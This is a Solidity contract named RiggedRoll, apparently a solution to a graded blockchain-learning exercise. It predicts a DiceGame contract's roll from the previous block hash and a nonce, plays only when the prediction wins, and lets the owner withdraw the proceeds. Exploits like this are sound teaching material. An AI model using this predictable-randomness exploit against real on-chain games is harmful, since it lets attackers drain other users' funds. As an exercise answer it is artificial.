pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negatively impacts submission grading
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;
    uint256 private trackedNonce;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
        trackedNonce = 0; 
    }

    function withdraw(address payable to, uint256 amount) external onlyOwner {
        require(amount <= address(this).balance, "Insufficient balance");
        to.transfer(amount);
        console.log("Withdrew", amount, "Wei to", to);
    }
    
    function riggedRoll() external {
        require(address(this).balance >= 0.002 ether, "Insufficient contract balance");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), trackedNonce));
        uint256 rollResult = uint256(hash) % 16;

        console.log("Predicted roll result:", rollResult);

        require(rollResult <= 5, "Predicted roll is not a winning number");

        diceGame.rollTheDice{value: 0.002 ether}();
        console.log("Rigged roll executed successfully");

        trackedNonce++;
    }

    receive() external payable {
        console.log("Received Ether:", msg.value, "Wei");
    }
}
